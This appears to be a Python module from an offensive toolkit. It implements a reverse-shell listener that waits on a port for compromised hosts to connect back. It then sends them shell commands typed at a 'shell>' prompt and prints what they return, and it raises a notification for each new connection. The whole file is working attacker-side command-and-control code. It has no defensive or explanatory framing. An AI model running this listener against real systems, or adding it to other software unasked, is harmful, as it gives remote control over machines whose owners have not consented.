import os
import socket
import signal
import re
from typing import Optional
from rich.console import Console
from voidxtool.gui.language import Msg
from voidxtool.utilities import SendNotification

console: Console = Console()

class ReverseShellListener:
    def __init__(self, port: int):
        """
        Initialize the reverse shell listener.
        :param port: int: The port number to listen on
        """
        self.port = port
        self.sock = None
        self.current_connection = None
        self.running = True
        self.original_signal = signal.getsignal(signal.SIGINT)
        self._setup_socket()

    def _setup_socket(self):
        """
        Set up the socket to listen for incoming connections.
        """
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('0.0.0.0', self.port))
        self.sock.listen(1)
        self.sock.settimeout(2)
        console.print(Msg.get('commands.shell.messages.listening').replace('%port%', str(self.port)))

    def _signal_handler(self, sig, frame):
        """
        Custom signal handler to clean up resources and exit.
        :param sig: Signal number
        :param frame: Current stack frame
        """
        self._cleanup()
        signal.signal(signal.SIGINT, self.original_signal)
        raise KeyboardInterrupt

    def _cleanup(self):
        """Centralized cleanup method to close sockets and stop running."""
        self.running = False
        if self.current_connection:
            self.current_connection.close()
            self.current_connection = None
        if self.sock:
            self.sock.close()
            self.sock = None

    def _receive_data(self, timeout: float = 2, idle_timeout: float = 1) -> bytes:
        """
        Receive data from the current connection, stopping after inactivity.
        :param timeout: float: Initial timeout for first packet
        :param idle_timeout: float: Timeout after last packet received
        :return: bytes: All data received
        """
        data = b''
        conn = self.current_connection
        if not conn:
            return None
        conn.settimeout(timeout)
        try:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
                conn.settimeout(idle_timeout)
        except socket.timeout:
            pass
        return data

    def _handle_client_session(self):
        """
        Handle the interactive session with the connected client.
        """
        signal.signal(signal.SIGINT, self.original_signal)
        self.current_connection.sendall(b'pwd\n')
        response = self._receive_data(timeout=2)
        decoded = response.decode('utf-8', errors='replace') if response else ''
        decoded = re.sub(r'\x1b\]0;.*?\x07', '', decoded)
        cwd = decoded.splitlines()[-1] if decoded.splitlines() else ''
        console.print(f"[bold green]Reverse shell connected![/bold green] Current directory: {cwd}")
        try:
            while self.running:
                cmd = console.input("[bold cyan]shell>[/bold cyan] ")
                if cmd.strip().lower() in ('exit', 'quit'):
                    break
                self.current_connection.sendall((cmd + '\n').encode())
                output = self._receive_data(timeout=2)
                if output:
                    console.print(output.decode('utf-8', errors='replace'))
        except KeyboardInterrupt:
            pass
        finally:
            self._cleanup()

    def run(self):
        """Run the server loop, accepting the incoming connection."""
        signal.signal(signal.SIGINT, self._signal_handler)
        console.print(f"[bold yellow]Waiting for reverse shell connection on port {self.port}...[/bold yellow]")
        try:
            while self.running:
                try:
                    conn, addr = self.sock.accept()
                    self.current_connection = conn
                    console.print(f"[bold green]Connection received from {addr}[/bold green]")
                    SendNotification(f"Reverse shell connection from {addr}")
                    self._handle_client_session()
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            pass
        finally:
            self._cleanup()